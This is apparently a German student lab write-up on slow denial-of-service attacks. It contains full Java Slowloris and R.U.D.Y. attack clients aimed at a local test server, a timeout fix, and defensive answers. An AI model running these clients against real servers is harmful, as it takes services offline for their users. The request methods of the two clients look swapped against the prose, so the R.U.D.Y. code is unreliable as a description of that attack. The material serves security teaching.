---
title: Slow DDoS-Angriffe 
author: Paul Nykiel
date: \today
---

# Webserver
Die `SimpleHTTPServer` Klasse wurde folgendermaßen angepasst:
```java
public static void main (String[] args) throws IOException {
    ExecutorService executorService = Executors.newFixedThreadPool(threadPoolSize);

    ServerSocket serverSocket = new ServerSocket(port);
    while (true) {
        Socket clientSocket = serverSocket.accept();

        executorService.submit(new ConnectionThread(clientSocket));

        System.out.println("Connection from " + clientSocket.getRemoteSocketAddress()
                + "; Active Connections: " + ConnectionThread.activeConnections.get());
    }
}
```

# Slow Loris
Die gesamte Slow-Loris Implementierung (Aufgabe 2 und 4) sieht folgendermaßen aus:
```java
package assignment.attacks;

import java.io.IOException;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.ThreadLocalRandom;

public class Slowloris {
    static String host = "127.0.0.1";
    static int port = 12345;
    static int threads;

    static List<Socket> socketList;

    public static void main(String[] args) throws InterruptedException, IOException {
        // Not with executor to save resources on attacker side
        socketList = new ArrayList<>();

        for (int c=0; c<15; ++c) {
            openSocket();
        }

        while (true) {
            Thread.sleep(8000);
            for (var socket : socketList) {
                sendLine(socket);
            }
        }
    }

    private static void openSocket() throws IOException {
        Socket socket = new Socket(host, port);
        var ostream = socket.getOutputStream();

        String header = "POST / HTTP/1.1";

        ostream.write(header.getBytes());

        socketList.add(socket);
    }

    private static void sendLine(Socket socket) throws IOException {
        var ostream = socket.getOutputStream();

        StringBuilder field = new StringBuilder();
        for (int c=0; c<8; ++c) {
            byte asciiVal = (byte) (ThreadLocalRandom.current().nextInt(46) + 'A');
            if (asciiVal > 'Z') {
                asciiVal = (byte) (asciiVal - 'A' - 26 + 'a');
            }
            field.append((char) asciiVal);
        }

        String line = "\r\nX-" + field.toString() + ": " + ThreadLocalRandom.current().nextInt(10000);
        System.out.print(line);

        ostream.write(line.getBytes());
    }
}
```

# WebServer-Timeouts
Für Timeouts (hier 10 Sekunden) wurde folgende Zeile am begin der `run`-Methode des `ConnectionThread` ergänzt:
```java
clientSocket.setSoTimeout(10000);
```


# R.U.D.Y
Die R.U.D.Y Implementierung ist quasi identisch zu Slow-Lorris, nur mit Post-Requests:
```java
package assignment.attacks;

import java.io.IOException;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ThreadLocalRandom;

public class RuDY {

    static String host = "127.0.0.1";
    static int port = 12345;
    static int threads;

    static List<Socket> socketList;

    public static void main(String[] args) throws IOException, InterruptedException {
        // Not with executor to save resources on attacker side
        socketList = new ArrayList<>();

        for (int c=0; c<15; ++c) {
            openSocket();
        }

        while (true) {
            Thread.sleep(8000);
            for (var socket : socketList) {
                sendLine(socket);
            }
        }
    }

    private static void openSocket() throws IOException {
        Socket socket = new Socket(host, port);

        var ostream = socket.getOutputStream();

        String header = "GET / HTTP/1.1";

        ostream.write(header.getBytes());

        socketList.add(socket);
    }

    private static void sendLine(Socket socket) throws IOException {
        var ostream = socket.getOutputStream();

        StringBuilder field = new StringBuilder();
        for (int c=0; c<8; ++c) {
            byte asciiVal = (byte) (ThreadLocalRandom.current().nextInt(46) + 'A');
            if (asciiVal > 'Z') {
                asciiVal = (byte) (asciiVal - 'A' - 26 + 'a');
            }
            field.append((char) asciiVal);
        }

        String line = "\r\nX-" + field.toString() + ": " + ThreadLocalRandom.current().nextInt(10000);
        System.out.print(line);

        ostream.write(line.getBytes());
    }
}
```

# Fragen
 * Es handelt es sich um eine Apache ähnliche Architektur, da für jede Verbindung ein neuer Thread aufgemacht wird,
    dadurch wird der Server anfällig für Slow DDoS Angriffe.
 * Manche Endgeräte (vor allem mobile Geräte mit schlechter Internetanbindung) senden im regulären Betrieb bereits
    nur sehr langsam Daten und könnten so fälschlicherweise als Angreifer klassifiziert und damit ausgeschlossen
    werden.
 * Nein, so kann der Server nur noch weiter überlastet werden. Die Kosten für weitere Verbindungen sind für den Server
    im Vergleich zum Angreifer deutlich größer.
 * Ansätze:
   * Bessere Serverarchitektur: nicht für jeden Client eine eigene Verbindung (vgl. Nginx)
   * Semantische Nachrichtenanalyse: Kontroller ob Empfangene Nachrichten (-Teile) sinnvoll sind
   * Minimale Übertragungsraten (muss natürlich entsprechend gewählt werden, so dass valide Clients weiter zugreifen
        können).
